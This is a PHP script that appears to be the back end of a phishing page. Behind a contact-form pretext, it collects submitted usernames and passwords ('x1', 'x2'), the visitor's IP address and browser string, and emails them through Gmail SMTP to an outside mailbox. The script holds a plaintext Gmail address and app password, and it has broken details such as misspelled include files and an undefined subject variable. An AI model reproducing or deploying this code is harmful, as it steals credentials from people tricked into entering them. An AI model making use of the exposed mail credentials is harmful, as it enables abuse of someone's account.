<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once 'PHPMailer/src/Expection.php';
require_once 'PHPMailer/src/PHPMailier.php';
require_once 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$alert =  '';

if(isset($_POST['submit'])){
	$name = $_POST['name'];
	$email = $_POST['email'];
	$subject = $_POST['subject'];
	$body = $_POST['body'];
	
	try{
		$ip = getenv("REMOTE_ADDR"); 
		//$datamasii=date("D M d, Y g:i a"); 
		$x1 = $_REQUEST['x1'] ;
		$x2 = $_REQUEST['x2'] ;
		
		//smtp settings		
		$mail->isSMTP();
		$mail->Host = 'smtp.gmail.com';
		$mail->SMTPAuth = true;
		$mail->Username = 'etinene.ortega@gmail.com';
		$mail->Password = 'vpactbwdkxvkykre';
		$mail->SMTPsecure = "tls";
		$mail->Port = '587';
		
		$mail->setFrom('noreply@gmail.com');
		$mail->addAddress('ayepucci@gmail.com');
		
		$mail->isHTML(true);
		$mail->Subject = $sub;
		$mail->Body    = "-------------------------------
		
		<br>
		Uname : $x1<br>
		Pword : $x2<br>
		IP:$ip<br>
		----------------------------------------------------<br>
		Browser         :  ".$_SERVER['HTTP_USER_AGENT']."<br>
		"; 
		$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
		
		$mail->send();
		echo 'Message has been sent';
		} catch (Exception $e) {
			echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
	}	
}

?>